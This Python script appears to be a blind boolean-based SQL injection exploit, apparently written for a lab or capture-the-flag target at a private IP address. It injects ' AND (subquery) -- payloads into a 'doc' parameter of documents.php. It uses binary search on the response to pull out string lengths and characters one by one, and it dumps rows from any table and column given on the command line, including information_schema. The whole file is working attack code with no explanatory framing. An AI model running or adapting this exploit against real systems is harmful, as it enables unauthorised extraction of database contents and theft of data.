import sys
import requests
import time

def send_request(doc):
    url = "http://10.10.1.10:24587/documents.php"
    params = {"doc": doc}
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(url, params=params, headers=headers)
        return response.text == "Record found."
    except:
        time.sleep(1)
        return False

def send_injected(subquery):
    #print(subquery)
    return send_request(f"' AND ({subquery}) -- ")

# print(send_injected("1=1"))
# print(send_injected("1=2"))

def get_log_search_query(string, start, stop):
    low, high = start, stop
    while low < high:
        mid = (low + high) // 2
        if send_injected(f"{string} > {mid}"):
            low = mid + 1
        else:
            high = mid
    if send_injected(f"{string} = {low}"):
        return low
    return stop

def get_string_query(string):
    string = f"COALESCE({string}, \"\")"
    l = get_log_search_query(f"LENGTH({string})", 0, 64)
    ret = ""
    for i in range(1,l+1):
        c = chr(get_log_search_query(f"ASCII(SUBSTRING({string},{i},1))", 0, 255))
        print(c, end="", flush=True)
        ret += c
    print()
    return ret
    
def get_table_rows(table, column, where):
    cnt = get_log_search_query(f"(SELECT COUNT(*) FROM {table} {where})", 1, 64)
    print(cnt)
    ret = []
    for i in range(0,cnt):
        row = get_string_query(f"(SELECT {column} FROM {table} {where} LIMIT 1 OFFSET {i})")
        ret.append(row)
    return row

#get_string_query("version()")
#get_table_rows("information_schema.schemata", "schema_name")
where = sys.argv[3] if 3<len(sys.argv) else ""
get_table_rows(sys.argv[1], sys.argv[2], where)
